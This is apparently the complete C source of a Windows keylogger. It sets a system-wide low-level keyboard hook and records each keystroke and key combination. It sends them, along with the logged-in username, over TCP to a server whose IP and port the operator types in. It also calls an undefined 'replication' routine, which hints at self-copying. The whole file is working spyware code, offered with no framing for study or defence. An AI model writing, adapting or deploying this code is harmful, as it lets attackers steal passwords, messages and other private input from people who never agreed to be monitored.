#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <fcntl.h>
#include <io.h>
#include <Lmcons.h>

#pragma comment(lib, "ws2_32.lib")

#define IP_LEN 16
#define PORT_BUFFER_LEN 10

#define BUFFER_SIZE 1024

SOCKET sock = INVALID_SOCKET;

static BOOL pendingCtrl = FALSE;
static BOOL comboUsed = FALSE;
static BOOL keyStateTracker[256] = { FALSE };

BOOL IsModifierKey(DWORD vkCode) {
	return (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
		vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
		vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
		vkCode == VK_LWIN || vkCode == VK_RWIN);
}

void GetKeyNameCustom(DWORD vkCode, char *buffer, size_t bufferSize) {
	switch (vkCode) {
	case VK_RETURN:   strcpy_s(buffer, bufferSize, "ENTER"); return;
	case VK_BACK:     strcpy_s(buffer, bufferSize, "BACKSPACE"); return;
	case VK_TAB:      strcpy_s(buffer, bufferSize, "TAB"); return;
	case VK_ESCAPE:   strcpy_s(buffer, bufferSize, "ESC"); return;
	case VK_SPACE:    strcpy_s(buffer, bufferSize, "SPACE"); return;
	case VK_DELETE:   strcpy_s(buffer, bufferSize, "DEL"); return;
	case VK_INSERT:   strcpy_s(buffer, bufferSize, "INSERT"); return;
	case VK_HOME:     strcpy_s(buffer, bufferSize, "HOME"); return;
	case VK_END:      strcpy_s(buffer, bufferSize, "END"); return;
	case VK_PRIOR:    strcpy_s(buffer, bufferSize, "PAGEUP"); return;
	case VK_NEXT:     strcpy_s(buffer, bufferSize, "PAGEDOWN"); return;
	case VK_LEFT:     strcpy_s(buffer, bufferSize, "LEFT"); return;
	case VK_UP:       strcpy_s(buffer, bufferSize, "UP"); return;
	case VK_RIGHT:    strcpy_s(buffer, bufferSize, "RIGHT"); return;
	case VK_DOWN:     strcpy_s(buffer, bufferSize, "DOWN"); return;
	case VK_CAPITAL:  strcpy_s(buffer, bufferSize, "CAPSLOCK"); return;
	case VK_NUMLOCK:  strcpy_s(buffer, bufferSize, "NUMLOCK"); return;
	case VK_SCROLL:   strcpy_s(buffer, bufferSize, "SCROLLLOCK"); return;
	case VK_SNAPSHOT: strcpy_s(buffer, bufferSize, "PRINTSCREEN"); return;
	case VK_PAUSE:    strcpy_s(buffer, bufferSize, "PAUSE"); return;
	case VK_APPS:     strcpy_s(buffer, bufferSize, "MENU_KEY"); return;

	case VK_VOLUME_MUTE:      strcpy_s(buffer, bufferSize, "MUTE"); return;
	case VK_VOLUME_DOWN:      strcpy_s(buffer, bufferSize, "VOL_DOWN"); return;
	case VK_VOLUME_UP:        strcpy_s(buffer, bufferSize, "VOL_UP"); return;
	case VK_MEDIA_NEXT_TRACK: strcpy_s(buffer, bufferSize, "NEXT_TRACK"); return;
	case VK_MEDIA_PREV_TRACK: strcpy_s(buffer, bufferSize, "PREV_TRACK"); return;
	case VK_MEDIA_STOP:       strcpy_s(buffer, bufferSize, "MEDIA_STOP"); return;
	case VK_MEDIA_PLAY_PAUSE: strcpy_s(buffer, bufferSize, "PLAY_PAUSE"); return;

	case VK_F1:  strcpy_s(buffer, bufferSize, "F1"); return;
	case VK_F2:  strcpy_s(buffer, bufferSize, "F2"); return;
	case VK_F3:  strcpy_s(buffer, bufferSize, "F3"); return;
	case VK_F4:  strcpy_s(buffer, bufferSize, "F4"); return;
	case VK_F5:  strcpy_s(buffer, bufferSize, "F5"); return;
	case VK_F6:  strcpy_s(buffer, bufferSize, "F6"); return;
	case VK_F7:  strcpy_s(buffer, bufferSize, "F7"); return;
	case VK_F8:  strcpy_s(buffer, bufferSize, "F8"); return;
	case VK_F9:  strcpy_s(buffer, bufferSize, "F9"); return;
	case VK_F10: strcpy_s(buffer, bufferSize, "F10"); return;
	case VK_F11: strcpy_s(buffer, bufferSize, "F11"); return;
	case VK_F12: strcpy_s(buffer, bufferSize, "F12"); return;

	case VK_NUMPAD0: strcpy_s(buffer, bufferSize, "NUM0"); return;
	case VK_NUMPAD1: strcpy_s(buffer, bufferSize, "NUM1"); return;
	case VK_NUMPAD2: strcpy_s(buffer, bufferSize, "NUM2"); return;
	case VK_NUMPAD3: strcpy_s(buffer, bufferSize, "NUM3"); return;
	case VK_NUMPAD4: strcpy_s(buffer, bufferSize, "NUM4"); return;
	case VK_NUMPAD5: strcpy_s(buffer, bufferSize, "NUM5"); return;
	case VK_NUMPAD6: strcpy_s(buffer, bufferSize, "NUM6"); return;
	case VK_NUMPAD7: strcpy_s(buffer, bufferSize, "NUM7"); return;
	case VK_NUMPAD8: strcpy_s(buffer, bufferSize, "NUM8"); return;
	case VK_NUMPAD9: strcpy_s(buffer, bufferSize, "NUM9"); return;
	case VK_MULTIPLY: strcpy_s(buffer, bufferSize, "NUM*"); return;
	case VK_ADD:      strcpy_s(buffer, bufferSize, "NUM+"); return;
	case VK_SUBTRACT: strcpy_s(buffer, bufferSize, "NUM-"); return;
	case VK_DECIMAL:  strcpy_s(buffer, bufferSize, "NUM."); return;
	case VK_DIVIDE:   strcpy_s(buffer, bufferSize, "NUM/"); return;
	}

	if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
		buffer[0] = (char)vkCode;
		buffer[1] = '\0';
		return;
	}

	UINT ch = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
	if (ch != 0) {
		buffer[0] = (char)ch;
		buffer[1] = '\0';
		return;
	}

	sprintf_s(buffer, bufferSize, "0x%02X", vkCode);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
		DWORD vkCode = kbdStruct->vkCode;
		DWORD scanCode = kbdStruct->scanCode;

		if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
			if (vkCode < 256) keyStateTracker[vkCode] = FALSE;

			if (pendingCtrl && (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL)) {
				wprintf(L"Sent: [CTRL]\n");
				fflush(stdout);
				send(sock, "[CTRL]", 6, 0);
				pendingCtrl = FALSE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			if (IsModifierKey(vkCode)) {
				if (!comboUsed) {
					const char *modName = NULL;
					if (vkCode == VK_LMENU || vkCode == VK_MENU) modName = "[ALT]";
					else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT) modName = "[SHIFT]";
					else if (vkCode == VK_LWIN || vkCode == VK_RWIN) modName = "[WIN]";
					else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL) modName = "[CTRL]";

					if (modName != NULL) {
						wprintf(L"Sent: %hs\n", modName);
						fflush(stdout);
						send(sock, modName, (int)strlen(modName), 0);
					}
				}

				BOOL isCtrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
				BOOL isAlt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
				BOOL isShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
				BOOL isWin = ((GetAsyncKeyState(VK_LWIN) & 0x8000) != 0) || ((GetAsyncKeyState(VK_RWIN) & 0x8000) != 0);

				if (!isCtrl && !isAlt && !isShift && !isWin) {
					comboUsed = FALSE;
				}
			}
			return CallNextHookEx(NULL, nCode, wParam, lParam);
		}

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

			if (vkCode < 256 && keyStateTracker[vkCode]) {
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}
			if (vkCode < 256) keyStateTracker[vkCode] = TRUE;

			if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL) {
				pendingCtrl = TRUE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			BOOL isAltGrKey = (vkCode == VK_RMENU) ||
				((vkCode == VK_MENU) && (kbdStruct->flags & LLKHF_EXTENDED));

			if (pendingCtrl) {
				if (isAltGrKey) {
					pendingCtrl = FALSE;
				}
				else {
					pendingCtrl = FALSE;
				}
			}

			if (isAltGrKey) {
				wprintf(L"Sent: [ALTGR]\n");
				fflush(stdout);
				send(sock, "[ALTGR]", 7, 0);
				comboUsed = TRUE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			if (IsModifierKey(vkCode)) {
				comboUsed = FALSE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			BOOL isAltGrPressed = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0 ||
				((kbdStruct->flags & LLKHF_EXTENDED) && (GetAsyncKeyState(VK_MENU) & 0x8000));

			BOOL isCtrlPressed = ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0) && !isAltGrPressed;
			BOOL isAltPressed = ((GetAsyncKeyState(VK_MENU) & 0x8000) != 0) && !isAltGrPressed;
			BOOL isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
			BOOL isWinPressed = ((GetAsyncKeyState(VK_LWIN) & 0x8000) != 0) || ((GetAsyncKeyState(VK_RWIN) & 0x8000) != 0);

			BOOL hasShortcutModifier = (isCtrlPressed || isAltPressed || isWinPressed);

			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			keyboardState[VK_SHIFT] = isShiftPressed ? 0x80 : 0;
			keyboardState[VK_CONTROL] = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 0x80 : 0;
			keyboardState[VK_MENU] = (GetAsyncKeyState(VK_MENU) & 0x8000) ? 0x80 : 0;
			keyboardState[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 0x0001);

			HWND foreground = GetForegroundWindow();
			DWORD threadId = GetWindowThreadProcessId(foreground, NULL);
			HKL layout = GetKeyboardLayout(threadId);

			wchar_t unicodeBuf[8] = { 0 };
			int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuf, 8, 0, layout);

			if (!hasShortcutModifier && result > 0 && unicodeBuf[0] >= 32) {
				wprintf(L"Sent: %.*ls\n", result, unicodeBuf);
				fflush(stdout);

				char utf8Buf[32] = { 0 };
				int utf8Len = WideCharToMultiByte(CP_UTF8, 0, unicodeBuf, result, utf8Buf, sizeof(utf8Buf), NULL, NULL);

				if (utf8Len > 0) {
					send(sock, utf8Buf, utf8Len, 0);
				}
				comboUsed = TRUE;
			}
			else {
				comboUsed = TRUE;

				char comboBuf[64] = { 0 };
				char keyName[32] = { 0 };
				GetKeyNameCustom(vkCode, keyName, sizeof(keyName));

				if (hasShortcutModifier) {
					strcat_s(comboBuf, sizeof(comboBuf), "[");
					if (isCtrlPressed)  strcat_s(comboBuf, sizeof(comboBuf), "CTRL+");
					if (isAltPressed)   strcat_s(comboBuf, sizeof(comboBuf), "ALT+");
					if (isWinPressed)   strcat_s(comboBuf, sizeof(comboBuf), "WIN+");
					if (isShiftPressed) strcat_s(comboBuf, sizeof(comboBuf), "SHIFT+");

					strcat_s(comboBuf, sizeof(comboBuf), keyName);
					strcat_s(comboBuf, sizeof(comboBuf), "]");
				}
				else {
					sprintf_s(comboBuf, sizeof(comboBuf), "[%s]", keyName);
				}

				wprintf(L"Sent: %hs\n", comboBuf);
				fflush(stdout);

				send(sock, comboBuf, (int)strlen(comboBuf), 0);
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {

	char SERVER_IP[IP_LEN];
	char port_buffer[PORT_BUFFER_LEN];
	char input_buffer[100];
	int SERVER_PORT;
	int valid = 0;

	while (!valid) {
		printf("Press Enter to continue with default IP and port (127.0.0.1:8080), or type 'custom' to enter manually: ");

		if (fgets(input_buffer, sizeof(input_buffer), stdin) != NULL) {
			input_buffer[strcspn(input_buffer, "\n")] = '\0';

			if (input_buffer[0] == '\0') {
				snprintf(SERVER_IP, sizeof(SERVER_IP), "127.0.0.1");
				SERVER_PORT = 8080;
				valid = 1;
			}
			else if (strcmp(input_buffer, "custom") == 0) {
				int ip_valid = 0;
				while (!ip_valid) {
					printf("\nEnter Server IP Address: ");
					if (fgets(SERVER_IP, sizeof(SERVER_IP), stdin) != NULL) {
						SERVER_IP[strcspn(SERVER_IP, "\n")] = '\0';

						struct in_addr sa;
						if (inet_pton(AF_INET, SERVER_IP, &sa) == 1) {
							ip_valid = 1;
						}
						else {
							printf("\nError: Invalid IP address format! Please try again.");
						}
					}
				}

				int port_valid = 0;
				while (!port_valid) {
					printf("Enter Server Port (1-65535): ");
					if (fgets(port_buffer, sizeof(port_buffer), stdin) != NULL) {
						char *endptr;
						long val = strtol(port_buffer, &endptr, 10);

						if (endptr != port_buffer && (*endptr == '\n' || *endptr == '\0') && (val >= 1 && val <= 65535)) {
							SERVER_PORT = (int)val;
							port_valid = 1;
							valid = 1;
						}
						else {
							printf("\nError: Invalid port number! Must be an integer between 1 and 65535.");
						}
					}
				}
			}
			else {
				printf("Error: Unknown command. Please press Enter or type 'custom'.\n\n");
			}
		}
	}

	replication();

	WSADATA wsaData;
	struct sockaddr_in serv_addr;

	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);
	_setmode(_fileno(stdout), _O_U8TEXT);
	_setmode(_fileno(stderr), _O_U8TEXT);

	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
	if (!hook) {
		fwprintf(stderr, L"Hook could not be set up: %lu\n", GetLastError());
		return 1;
	}

	wprintf(L"\nInitializing Winsock...\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		wprintf(L"Error: WSAStartup failed. Error Code: %d\n", WSAGetLastError());
		return 1;
	}

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		wprintf(L"Error: Could not create socket. Error Code: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(SERVER_PORT);

	if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
		wprintf(L"Error: Invalid or unsupported address.\n");
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	wprintf(L"Connecting to the server... (%hs:%d)\n", SERVER_IP, SERVER_PORT);
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
		wprintf(L"Error: Connection failed.\n");
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	wprintf(L"Connection successful!\n\n");

	wchar_t userName[UNLEN + 1];
	DWORD unLen = UNLEN + 1;

	if (GetUserNameW(userName, &unLen)) {
		wprintf(L"Username: %ls\n", userName);

		int bytesToSend = unLen * sizeof(wchar_t);
		send(sock, (const char *)userName, bytesToSend, 0);

		wchar_t debugLog[UNLEN + 50];
		swprintf_s(debugLog, _countof(debugLog), L"sent: %ls\n", userName);
		OutputDebugStringW(debugLog);
	}
	else {
		wchar_t errorLog[100];
		swprintf_s(errorLog, _countof(errorLog), L"Error Code: %lu\n", GetLastError());
		OutputDebugStringW(errorLog);
	}


	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hook);

	closesocket(sock);
	WSACleanup();
}
